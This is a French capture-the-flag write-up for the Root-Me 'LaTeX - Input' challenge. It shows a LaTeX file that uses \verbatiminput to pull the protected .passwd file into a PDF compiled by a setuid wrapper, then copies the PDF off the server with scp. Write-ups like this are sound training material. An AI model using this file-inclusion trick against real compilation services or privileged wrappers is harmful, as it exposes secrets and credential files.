# LaTeX - Input

## 10 Points

### Introduction à LaTeX

### Énoncé

Savez-vous comment fonctionne la commande input ?

## Solution

Ecriture d'un fichier en LaTeX qui récupère le contenu du fichier .passwd dans l'objectif de, lors de la convertion en pdf, le contenu du fichier apparaisse.

```
app-script-ch23@challenge02:~$ cat /tmp/thibault/main.tex

\documentclass{article}

\usepackage{verbatim}

\begin{document}

\section*{Content of \texttt{.passwd} file}

\verbatiminput{.passwd}

\end{document}
```
```Bash
app-script-ch23@challenge02:~$ ./setuid-wrapper /tmp/thibault/main.tex

[+] Compilation ...

[+] Output file : /tmp/tmp.U5LKARq7sA/main.pdf

**app-script-ch23@challenge02**:~$
```
En suite sur ma propre machine:

```Bash
➜  ~ scp -P 22 app-script-ch23@challenge02.root-me.org:/tmp/tmp.U5LKARq7sA/main.pdf .
**➜  ~** open main.pdf
```